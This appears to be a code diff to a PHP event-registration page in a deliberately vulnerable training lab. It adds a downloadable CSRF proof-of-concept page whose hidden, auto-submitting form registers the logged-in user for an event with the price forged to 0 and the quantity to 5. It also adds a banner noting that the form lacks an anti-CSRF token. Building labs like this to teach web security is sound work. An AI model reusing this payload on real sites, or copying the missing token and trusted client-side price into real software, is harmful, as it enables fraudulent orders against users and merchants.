@@ -4,6 +4,45 @@ require_once __DIR__ . '/../src/helpers.php';
 
 check_login();
 
+// 提供一鍵 CSRF 報名 PoC 網頁下載
+if (isset($_GET['download_csrf_poc'])) {
+    $e_id = intval($_GET['event_id'] ?? 1);
+    header('Content-Type: text/html');
+    header('Content-Disposition: attachment; filename="csrf-register-poc.html"');
+    echo '<!DOCTYPE html>
+<html lang="zh-TW">
+<head>
+    <meta charset="UTF-8">
+    <title>一鍵 CSRF 課程報名攻擊測試 (PoC)</title>
+</head>
+<body style="font-family: sans-serif; text-align: center; padding-top: 100px; background-color: #f8f9fa;">
+    <div style="max-width: 600px; margin: 0 auto; background: white; padding: 40px; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.1);">
+        <h2 style="color: #dc3545;">⚠️ 模擬黑客 CSRF 跨站攻擊頁面</h2>
+        <p>此頁面模擬一個外部惡意網站。當您在本機雙擊開啟它時，它會在背景自動發送 POST 請求到您的弱點版靶場，強制幫您報名課程。</p>
+        <p style="color: #6c757d;">(只要您目前在弱點版靶場處於「已登入」狀態，攻擊就會利用您的 Cookie 成功執行)</p>
+        <br>
+        <h4 style="color: #0d6efd;">正在背景發送惡意 POST 報名請求...</h4>
+        
+        <form id="csrfForm" action="http://' . $_SERVER['HTTP_HOST'] . '/event_register.php?event_id=' . $e_id . '" method="POST" style="display:none;">
+            <input type="hidden" name="event_id" value="' . $e_id . '">
+            <!-- 惡意參數：將價格改為 0 元 (免費)，數量改為 5 -->
+            <input type="hidden" name="price" value="0">
+            <input type="hidden" name="quantity" value="5">
+            <input type="hidden" name="coupon_code" value="">
+        </form>
+
+        <script>
+            // 自動送出表單，達成 CSRF 攻擊
+            setTimeout(function() {
+                document.getElementById("csrfForm").submit();
+            }, 1500);
+        </script>
+    </div>
+</body>
+</html>';
+    exit;
+}
+
 $user_id = $_SESSION['user']['id'];
 $error = '';
 $success = '';
@@ -164,6 +203,12 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                         <input type="text" name="coupon_code" id="coupon_code" class="form-control col-md-6" placeholder="如 CAMPUS100">
                         <small class="form-text text-muted">可填入：<code>CAMPUS100</code> (折抵 100 元) 或 <code>FREE999</code> (折抵 999 元)</small>
                     </div>
+                </div>
+
+                <div class="alert alert-warning mt-4">
+                    🛡️ <strong>CSRF 跨站請求偽造挑戰：</strong><br>
+                    本表單在送出報名時缺少 Anti-CSRF Token，容易受到 CSRF 攻擊。<br>
+                    <a href="?download_csrf_poc=1&event_id=<?= $event['id'] ?>" class="btn btn-sm btn-outline-danger font-weight-bold mt-2">📥 下載一鍵 CSRF 報名攻擊 PoC</a>
                 </div>
 
                 <div class="text-right border-top pt-3">
